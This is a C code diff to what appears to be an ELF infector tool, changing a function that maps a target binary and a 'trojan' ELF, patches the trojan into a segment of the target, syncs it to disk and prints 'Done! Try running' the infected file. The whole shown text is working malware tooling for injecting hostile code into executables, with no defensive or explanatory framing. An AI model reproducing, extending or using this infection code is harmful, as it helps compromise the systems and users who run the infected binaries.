@@ -45,7 +45,7 @@ extern elf_info_t   _program[];
 static bool doit(const char *binfile, const char *trojan) {
     ASSERT_CON_RET_FALSE(binfile && trojan);
     open_mode_t m1,m2;
-    struct mapped_file map = {0};
+    struct mapped_file map = {0}, src_map = {0};
     bool rc = false;
     const char *file = binfile;
 
@@ -70,14 +70,26 @@ static bool doit(const char *binfile, const char *trojan) {
         log_error("Error loading target ELF\n");
         return rc;
     }
+    // File is mapped
+    file_close(fp);
+
+    if (!(rc = file_load_source(&src_map, trojanfp /** RO */))) {
+        log_error("Error loading source ELF\n");
+        return rc;
+    }
 
     elf_t *elfo = elf_parse_file(file, &map);
     if (elfo) {
         long magic = (long)0x1122334455667788;
-        infect_t *inf = inf_load(elfo, trojanfp, m1, magic);
+
+        infect_t *inf = inf_load(elfo, trojanfp, m1, magic, &src_map);
         if (inf_scan_segment(inf)) {
-            if ((rc = inf_load_and_patch(inf)) == true)
+            if ((rc = inf_load_and_patch(inf)) == true) {
+                // Make sure it is written
+                (void)file_sync_target(&map);
+
                 printf("Done!\nTry running %s\n", file);
+            }
             else
                 printf("Failed :(\n");
         }
@@ -87,7 +99,6 @@ static bool doit(const char *binfile, const char *trojan) {
         assert(elf_destroy_all(elfo));
     }
 
-    file_close(fp);
     file_close(trojanfp);
 
     return rc;
